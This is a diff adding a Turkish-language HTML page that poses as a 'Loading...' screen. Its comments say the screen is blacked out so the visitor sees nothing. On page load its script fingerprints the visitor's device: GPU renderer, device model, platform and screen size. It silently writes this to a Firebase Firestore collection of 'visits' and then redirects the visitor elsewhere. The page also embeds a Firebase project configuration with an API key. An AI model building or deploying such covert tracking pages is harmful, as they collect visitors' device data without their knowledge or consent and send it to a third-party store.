@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yükleniyor...</title>
+    <style>
+        /* Kullanıcı bir şey görmesin diye ekranı siyah yapıyoruz */
+        body { background: #000; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { color: #111; } /* Çok hafif bir yazı, istersen tamamen silebilirsin */
+    </style>
+</head>
+<body>
+
+<div class="loader">Sayfa Yükleniyor...</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyB0XVcXiShBEebqnHokvrb8S5XpKfTRAJA",
+        authDomain: "nexarasunar.firebaseapp.com",
+        projectId: "nexarasunar",
+        storageBucket: "nexarasunar.firebasestorage.app",
+        messagingSenderId: "698168474254",
+        appId: "1:698168474254:web:99a65bc95ce906a7e1e7df"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Hangi sayfaya yönlendirilsin?
+    const yonlendirilecekAdres = "https://www.google.com"; // BURAYI DEĞİŞTİR
+
+    async function captureAndRedirect() {
+        let model = "Bilinmiyor";
+        let os = navigator.platform;
+        let gpu = "Tespit edilemedi";
+
+        try {
+            // GPU ve Model Analizi
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                if (hints.model) model = hints.model;
+            }
+        } catch (e) {}
+
+        const screenRes = `${window.screen.width} x ${window.screen.height}`;
+
+        try {
+            // Veriyi sessizce Firestore'a gönder
+            await addDoc(collection(db, "ziyaretler"), {
+                model: model,
+                os: os,
+                gpu: gpu,
+                screen: screenRes,
+                tarih: serverTimestamp()
+            });
+        } catch (e) {
+            console.error("Hata olsa bile yönlendir...");
+        } finally {
+            // Veri gitsin ya da gitmesin, kullanıcıyı yönlendir
+            window.location.href = yonlendirilecekAdres;
+        }
+    }
+
+    window.onload = captureAndRedirect;
+</script>
+</body>
+</html>
